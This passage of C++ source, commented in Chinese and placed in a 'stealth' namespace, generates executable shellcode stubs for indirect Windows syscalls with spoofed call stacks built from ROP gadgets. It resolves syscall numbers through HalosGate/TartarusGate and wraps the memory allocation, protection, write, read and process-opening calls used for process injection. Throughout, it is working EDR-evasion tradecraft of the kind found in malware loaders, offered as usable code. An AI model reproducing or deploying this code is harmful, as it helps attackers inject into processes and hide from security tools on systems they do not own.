    int chainCount = (retGadgetCount < 4) ? retGadgetCount : 4;
    if (chainCount < 4) return nullptr;

    // 代码布局 (107 字节，支持 arg5+arg6 重定位):
    // [0]   5A                pop rdx
    // [1]   48 83 EC 28       sub rsp, 0x28
    // [5]   48 8B 84 24 48 00 00 00  mov rax, [rsp+0x48]  ; 读 arg5
    // [13]  48 89 84 24 28 00 00 00  mov [rsp+0x28], rax ; 写 arg5
    // [21]  48 8B 84 24 50 00 00 00  mov rax, [rsp+0x50]  ; 读 arg6
    // [29]  48 89 84 24 30 00 00 00  mov [rsp+0x30], rax ; 写 arg6
    // [37]  48 8B 05 +disp_g0       mov rax, [rip+disp]   ; gadget[0]
    // [44]  48 89 04 24             mov [rsp+0x00], rax
    // [48]  48 8B 05 +disp_g1       mov rax, [rip+disp]   ; gadget[1]
    // [55]  48 89 44 24 08          mov [rsp+0x08], rax
    // [60]  48 8B 05 +disp_g2       mov rax, [rip+disp]   ; gadget[2]
    // [67]  48 89 44 24 10          mov [rsp+0x10], rax
    // [72]  48 8B 05 +disp_g3       mov rax, [rip+disp]   ; gadget[3]
    // [79]  48 89 44 24 18          mov [rsp+0x18], rax
    // [84]  48 89 54 24 20          mov [rsp+0x20], rdx   ; 真实返回
    // [89]  4C 8B D1                mov r10, rcx
    // [92]  B8 +SSN                 mov eax, SSN
    // [97]  4C 8B 1D +disp_sys      mov r11, [rip+disp]   ; syscall;ret
    // [104] 41 FF E3                jmp r11
    const size_t totalCodeSize = 107;
    const size_t dataSectionSize = (static_cast<size_t>(chainCount) + 1) * 8;
    const size_t totalSize = totalCodeSize + dataSectionSize;

    // ★ BUILD 496: 栈上固定数组替代 std::vector<BYTE>
    BYTE stub[256]; // 107 + (5*8) = 147 < 256
    if (totalSize > sizeof(stub)) return nullptr;
    memset(stub, 0x90, totalSize);
    BYTE* codePtr = stub;
    BYTE* dataPtr = stub + totalCodeSize;

    size_t off = 0;

    // --- pop rdx (save real return) ---
    codePtr[off++] = 0x5A;

    // --- sub rsp, 0x28 ---
    codePtr[off++] = 0x48; codePtr[off++] = 0x83;
    codePtr[off++] = 0xEC; codePtr[off++] = 0x28;

    // --- fix arg5: mov rax, [rsp+0x48]; mov [rsp+0x28], rax ---
    codePtr[off++] = 0x48; codePtr[off++] = 0x8B;
    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
    codePtr[off++] = 0x48; codePtr[off++] = 0x00;
    codePtr[off++] = 0x00; codePtr[off++] = 0x00;

    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
    codePtr[off++] = 0x28; codePtr[off++] = 0x00;
    codePtr[off++] = 0x00; codePtr[off++] = 0x00;

    // --- fix arg6: mov rax, [rsp+0x50]; mov [rsp+0x30], rax ---
    codePtr[off++] = 0x48; codePtr[off++] = 0x8B;
    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
    codePtr[off++] = 0x50; codePtr[off++] = 0x00;
    codePtr[off++] = 0x00; codePtr[off++] = 0x00;

    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
    codePtr[off++] = 0x30; codePtr[off++] = 0x00;
    codePtr[off++] = 0x00; codePtr[off++] = 0x00;

    // --- for each gadget: mov rax, [rip+disp]; mov [rsp+i*8], rax ---
    for (size_t i = 0; i < chainCount; i++) {
        codePtr[off++] = 0x48; codePtr[off++] = 0x8B; codePtr[off++] = 0x05;
        int32_t disp = static_cast<int32_t>(totalCodeSize - off - 4 + i * 8);
        *reinterpret_cast<int32_t*>(codePtr + off) = disp;
        off += 4;

        if (i == 0) {
            codePtr[off++] = 0x48; codePtr[off++] = 0x89;
            codePtr[off++] = 0x04; codePtr[off++] = 0x24;
        } else {
            codePtr[off++] = 0x48; codePtr[off++] = 0x89;
            codePtr[off++] = 0x44; codePtr[off++] = 0x24;
            codePtr[off++] = static_cast<BYTE>(i * 8);
        }
    }

    // --- mov [rsp+0x20], rdx ---
    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
    codePtr[off++] = 0x54; codePtr[off++] = 0x24;
    codePtr[off++] = 0x20;

    // --- mov r10, rcx ---
    codePtr[off++] = 0x4C; codePtr[off++] = 0x8B; codePtr[off++] = 0xD1;

    // --- mov eax, SSN ---
    codePtr[off++] = 0xB8;
    *reinterpret_cast<DWORD*>(codePtr + off) = ssn;
    off += 4;

    // --- mov r11, [rip+disp]; jmp r11 ---
    codePtr[off++] = 0x4C; codePtr[off++] = 0x8B; codePtr[off++] = 0x1D;
    int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - off - 4);
    *reinterpret_cast<int32_t*>(codePtr + off) = syscDisp;
    off += 4;

    codePtr[off++] = 0x41; codePtr[off++] = 0xFF; codePtr[off++] = 0xE3;

    // ---- 数据段 ----
    for (size_t i = 0; i < chainCount; i++)
        *reinterpret_cast<uintptr_t*>(dataPtr + i * 8) = retGadgets[i];
    *reinterpret_cast<uintptr_t*>(dataPtr + chainCount * 8) = syscallRetGadget;

    void* execMem = VirtualAlloc(nullptr, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    // ★ BUILD 496: stub 是栈数组
    memcpy(execMem, stub, totalSize);

    DWORD oldProtect;
    if (!VirtualProtect(execMem, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return nullptr;
    }
    FlushInstructionCache(GetCurrentProcess(), execMem, totalSize);
    return execMem;
}

// 通用 syscall 执行: 选择方法, 生成 stub, 调用
template<typename FnType>
NTSTATUS ExecuteSyscall(const char* funcName, DWORD ssn,
                         SyscallMethod method, FnType&& setupArgs) {
    auto& resolver = SyscallResolver::Instance();
    SyscallMethod actualMethod = DecideMethod(method);

    void* stub = nullptr;

    switch (actualMethod) {
    case SyscallMethod::Indirect: {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        if (gadget) {
            stub = GenerateIndirectSyscallStub(ssn, gadget);
        }
        break;
    }
    case SyscallMethod::StackSpoof: {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
        break;
    }
    default:
        break;
    }

    // 降级: 如果高级方法失败, 回退到直接 syscall
    if (!stub) {
        stub = TartarusGate::GenerateSyscallStub(ssn);
    }

    using SyscallFn = NTSTATUS(NTAPI*)(...);

    if (!stub) {
        // 最终回退: 使用 ntdll 中的原版函数
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        auto fn = reinterpret_cast<FARPROC>(GetProcAddress(ntdll, funcName));
        if (!fn) return STATUS_NOT_SUPPORTED;
        return setupArgs(reinterpret_cast<SyscallFn>(fn));
    }

    return setupArgs(reinterpret_cast<SyscallFn>(stub));
}

} // anonymous namespace

// ============================================================
// 公开的 Syscall API 实现
// ============================================================

#define DEFINE_SYSCALL_WITH_METHOD(name, ntdllFn, ssnField, retType, ...) \
NTSTATUS name(__VA_ARGS__, SyscallMethod method) { \
    auto& resolver = SyscallResolver::Instance(); \
    DWORD ssn = resolver.GetNumbers().ssnField; \
    if (!ssn) { \
        resolver.InitializeHaloGate(); \
        ssn = resolver.GetNumbers().ssnField; \
    } \
    if (!ssn) { \
        /* 最终回退: 调用原始 ntdll 导出函数 */ \
        using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
        static auto fn = reinterpret_cast<Fn_t>( \
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), ntdllFn)); \
        if (fn) return fn(__VA_ARGS__); \
        return STATUS_NOT_SUPPORTED; \
    } \
    SyscallMethod m = DecideMethod(method); \
    void* stub = nullptr; \
    if (m == SyscallMethod::StackSpoof) { \
        uintptr_t gadget = resolver.GetSyscallRetGadget(); \
        int retGadgetCount = GetRetGadgetCount(); \
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext(); \
        if (gadget && retGadgetCount >= 4) { \
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx); \
        } \
    } \
    if (!stub && (m == SyscallMethod::Indirect)) { \
        uintptr_t gadget = resolver.GetSyscallRetGadget(); \
        stub = gadget ? GenerateIndirectSyscallStub(ssn, gadget) : nullptr; \
    } \
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn); \
    if (!stub) { \
        using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
        static auto fn = reinterpret_cast<Fn_t>( \
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), ntdllFn)); \
        if (fn) return fn(__VA_ARGS__); \
        return STATUS_NOT_SUPPORTED; \
    } \
    using Fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
    auto fn = reinterpret_cast<Fn_t>(stub); \
    return fn(__VA_ARGS__); \
}

// 使用宏避免代码膨胀, 但为可读性, 手动展开

// ---- SysAllocateVirtualMemory ----
NTSTATUS SysAllocateVirtualMemory(
    HANDLE hProcess, PVOID* baseAddr, ULONG_PTR zeroBits,
    PSIZE_T regionSize, ULONG allocType, ULONG protect,
    SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtAllocateVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtAllocateVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, zeroBits, regionSize, allocType, protect) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, zeroBits, regionSize, allocType, protect);
}

// ---- SysProtectVirtualMemory ----
NTSTATUS SysProtectVirtualMemory(
    HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
    ULONG newProtect, PULONG oldProtect, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtProtectVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtProtectVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, regionSize, newProtect, oldProtect) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, regionSize, newProtect, oldProtect);
}

// ---- SysWriteVirtualMemory ----
NTSTATUS SysWriteVirtualMemory(
    HANDLE hProcess, PVOID baseAddr, PVOID buffer,
    SIZE_T bytesToWrite, PSIZE_T bytesWritten, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtWriteVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtWriteVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, buffer, bytesToWrite, bytesWritten) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, buffer, bytesToWrite, bytesWritten);
}

// ---- SysReadVirtualMemory ----
NTSTATUS SysReadVirtualMemory(
    HANDLE hProcess, PVOID baseAddr, PVOID buffer,
    SIZE_T bytesToRead, PSIZE_T bytesRead, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtReadVirtualMemory;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtReadVirtualMemory; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtReadVirtualMemory"));
        return fn ? fn(hProcess, baseAddr, buffer, bytesToRead, bytesRead) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(stub)(hProcess, baseAddr, buffer, bytesToRead, bytesRead);
}

// ---- SysOpenProcess ----
NTSTATUS SysOpenProcess(
    PHANDLE hProcess, ACCESS_MASK desiredAccess,
    POBJECT_ATTRIBUTES objAttr, PCLIENT_ID clientId, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtOpenProcess;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtOpenProcess; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess"));
        return fn ? fn(hProcess, desiredAccess, objAttr, clientId) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    return reinterpret_cast<Fn>(stub)(hProcess, desiredAccess, objAttr, clientId);
}

// ---- SysQuerySystemInformation ----
NTSTATUS SysQuerySystemInformation(
    ULONG infoClass, PVOID info, ULONG infoLen,
    PULONG returnLen, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtQuerySystemInformation;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtQuerySystemInformation; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
        return fn ? fn(infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(infoClass, info, infoLen, returnLen);
}

// ---- SysQueryInformationProcess ----
NTSTATUS SysQueryInformationProcess(
    HANDLE hProcess, ULONG infoClass, PVOID info,
    ULONG infoLen, PULONG returnLen, SyscallMethod method)
{
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtQueryInformationProcess;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtQueryInformationProcess; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
        return fn ? fn(hProcess, infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    return reinterpret_cast<Fn>(stub)(hProcess, infoClass, info, infoLen, returnLen);
}

// ---- SysClose ----
NTSTATUS SysClose(HANDLE handle, SyscallMethod method) {
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtClose;
    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtClose; }

    SyscallMethod m = DecideMethod(method);
    void* stub = nullptr;
    if (m == SyscallMethod::StackSpoof) {
        uintptr_t gadget = resolver.GetSyscallRetGadget();
        int retGadgetCount = GetRetGadgetCount();
        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
        if (gadget && retGadgetCount >= 4) {
            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
        }
    }
    if (!stub && m == SyscallMethod::Indirect) {
        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
    }
    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
    if (!stub) {
        using Fn = NTSTATUS(NTAPI*)(HANDLE);
        auto fn = reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtClose"));
        return fn ? fn(handle) : STATUS_NOT_SUPPORTED;
    }
    using Fn = NTSTATUS(NTAPI*)(HANDLE);
    return reinterpret_cast<Fn>(stub)(handle);
}

} // namespace stealth
